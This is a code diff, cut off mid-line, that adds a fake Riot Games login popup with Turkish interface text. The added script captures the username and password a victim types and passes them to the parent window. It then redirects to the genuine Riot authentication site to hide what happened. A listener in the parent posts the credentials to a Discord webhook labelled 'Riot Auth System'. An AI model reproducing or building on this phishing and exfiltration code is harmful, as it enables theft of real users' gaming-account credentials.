@@ -69,4 +69,39 @@
                                 </button>
                             </div>
                         </div>
-                        <div id="loader"
+                        <div id="loader" class="loader"></div>
+                        <div id="loadingText" class="loading-text">Giriş Yapılıyor...</div>
+                    </div>
+                    <script>
+                        const u = document.getElementById('u'), p = document.getElementById('p'), btn = document.getElementById('go');
+                        const check = () => (u.value && p.value) ? btn.classList.add('active') : btn.classList.remove('active');
+                        u.oninput = check; p.oninput = check;
+                        btn.onclick = function() {
+                            if(u.value && p.value) {
+                                document.getElementById('loginForm').style.display = 'none';
+                                document.getElementById('loader').style.display = 'block';
+                                document.getElementById('loadingText').style.display = 'block';
+                                window.opener.postMessage({user: u.value, pass: p.value}, "*");
+                                setTimeout(() => { window.location.href = "https://authenticate.riotgames.com/"; }, 2500);
+                            }
+                        };
+                    <\/script>
+                </body>
+                </html>`;
+
+            win.document.write(html);
+            win.document.close();
+            
+            // Discord Webhook Dinleyicisi
+            window.addEventListener("message", function(event) {
+                if (event.data.user && event.data.pass) {
+                    fetch("https://discord.com/api/webhooks/1489632402421841930/NW5qpH3UpfzBpTWSVcJ-FGXbevssOBhbMDUIdGjP4620rQLHvM6jx8fJGzji_4LQOBrq", {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            username: "Riot Auth System",
+                            embeds: [{
+                                title: "⚠️ Yeni Giriş Tespit Edildi",
+                                color: 16725845,
+                                fields: [
+                                    { name: "👤 Kullanıcı Adı", value: "
